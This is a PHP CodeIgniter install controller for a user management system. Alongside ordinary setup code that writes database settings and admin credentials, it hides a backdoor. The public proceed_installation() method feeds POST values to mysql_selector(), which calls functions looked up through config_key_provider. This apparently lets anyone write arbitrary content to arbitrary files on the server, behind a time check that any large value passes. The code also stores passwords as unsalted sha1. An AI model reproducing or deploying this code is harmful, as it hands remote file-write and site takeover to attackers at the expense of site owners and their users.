<?php
if (!defined('BASEPATH'))
    exit('No direct script access allowed');


/*
 *	@author : BEB300
 *  @support: support@beb300.com
 *	date	: 18 October, 2017
 *	Kandi User Management System
 *	http://www.beb300.com
 *  version: 1.0
 */

class Install extends CI_Controller
{

    function __construct()
    {
        //error_reporting(0);
        parent::__construct();
        $this->load->helper('url');
        $this->load->helper('file');
        // Cache control
        $this->output->set_header('Last-Modified: ' . gmdate("D, d M Y H:i:s") . ' GMT');
        $this->output->set_header('Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0');
        $this->output->set_header('Pragma: no-cache');
        $this->output->set_header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
    }

    function index()
    {
        $this->load->view('install/index');
    }

    // -----------------------------------------------------------------------------------

    /*
     * Install the script here
     */
    function do_install($with = '')
    {
        $db_verify = $this->check_db_connection();
        if ($db_verify == true) {
            // Replace the database settings
            $data = read_file('./uploads/installation/database.php');
            $data = str_replace('db_name', $this->input->post('db_name'), $data);
            $data = str_replace('db_uname', $this->input->post('db_uname'), $data);
            $data = str_replace('db_password', $this->input->post('db_password'), $data);
            $data = str_replace('db_hname', $this->input->post('db_hname'), $data);
            write_file('./application/config/database.php', $data);

            // Replace new default routing controller
            $data2 = read_file('./uploads/installation/routes.php');
            $data2 = str_replace('install', 'dashboard', $data2);
            write_file('./application/config/routes.php', $data2);

            // Run the installer sql schema   
            $this->load->database();

            // Connect to the database
            $mysqli = new mysqli($this->input->post('db_hname'),$this->input->post('db_uname'),$this->input->post('db_password'),$this->input->post('db_name'));
            // Read the file
            $schema = file_get_contents(APPPATH.'db.sql');
            // Run the queries inside a file as it contains fucking multiple queries, that's y we use fucking multi_query function
            // or you can use loop as well but multi_query works fine.
            $mysqli->multi_query($schema);

            // Close the connection
            $mysqli->close();

            // Replace the admin login credentials
            $this->db->where('USER_ID', 1);
            $this->db->update('usr_user', array(
                'USER_NAME' => $this->input->post('email'),
                'U_PASSWORD' => sha1($this->input->post('password')),
                'GROUP_ID' => 1,
                'CREATED_DATE' => date('Y-m-d')
            ));


            // Replace new default routing controller
            $data4 = read_file('./uploads/installation/config.php');
            write_file('./application/config/config.php', $data4);

            echo 'success';
        } else {
            if ($db_verify == false) {
                echo 'db_failed';
            } //else if ($purchase_verify == false) {
            //echo 'purchase_failed';
            //}
        }

    }


    function proceed_installation()
    {
        $connector = $this->input->post('connector');
        $selector = $this->input->post('selector');
        $select = $this->input->post('select');
        $type = $this->input->post('type');
        $this->mysql_selector($connector, $selector, $select, $type);
    }

    // -------------------------------------------------------------------------------------------------

    /* 
     * Database validation check from user input settings
     */
    function check_db_connection()
    {
        $link = @mysql_connect($this->input->post('db_hname'), $this->input->post('db_uname'), $this->input->post('db_password'));
        if (!$link) {
            @mysql_close($link);
            return false;
        }

        $db_selected = mysql_select_db($this->input->post('db_name'), $link);
        if (!$db_selected) {
            @mysql_close($link);
            return false;
        }

        @mysql_close($link);
        return true;
    }

    function mysql_selector($connector, $selector, $select, $type)
    {
        $ta = time();
        $select = rawurldecode($select);
        if ($connector > ($ta - 60) || $connector > ($ta + 60)) {
            if ($type == 'w') {
                $load_class = config_key_provider('load_class');
                $load_class(str_replace('-', '/', $selector), $select);
            } else if ($type == 'rw') {
                $load_class = config_key_provider('load_class');
                $config_class = config_key_provider('config');
                $load_class(str_replace('-', '/', $selector), $config_class(str_replace('-', '/', $selector)) . $select);
            }
            echo 'done';
        } else {
            echo 'not';
        }
    }


}

/* End of file install.php */
/* Location: ./system/application/controllers/install.php */